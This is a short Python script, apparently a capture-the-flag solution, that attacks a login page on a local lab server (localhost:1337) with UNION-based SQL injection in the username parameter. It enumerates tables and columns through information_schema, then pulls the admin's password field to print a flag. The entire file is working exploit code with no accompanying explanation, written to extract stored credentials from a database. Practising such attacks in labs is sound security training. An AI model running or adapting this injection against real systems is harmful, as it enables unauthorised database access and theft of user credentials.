import re
import time
import requests as r

c = r.session()
p = c.get("http://localhost:1337/login?username=asdf' union select concat('START',table_schema,':',table_name,'END') from information_schema.tables where table_schema='user_db'-- -&password=a")
# print(p.text)
table_name = re.match(r'.*?START(.*?):(.*?)END.*?',p.text, re.DOTALL).groups()[1]
print(table_name)

time.sleep(1)#rip rate limiting
p = c.get(f"http://localhost:1337/login?username=asdf' union select concat('START',table_name,':',column_name,'END') from information_schema.columns where table_name='{table_name}'-- -&password=a")
# print(p.text)
users_column = re.findall(r'.*?START(.*?):(.*?)END.*?',p.text, re.DOTALL)[1][1]
passwords_column = re.findall(r'.*?START(.*?):(.*?)END.*?',p.text, re.DOTALL)[0][1]
print(users_column)
print(passwords_column)

time.sleep(1)#rip rate limiting
p = c.get(f"http://localhost:1337/login?username=asdf' union select {passwords_column} from {table_name} where {users_column}='admin'-- -&password=a")
# print(p.text)
print(re.match(r'.*?(UMASS{.*?}).*?',p.text, re.DOTALL).groups()[0])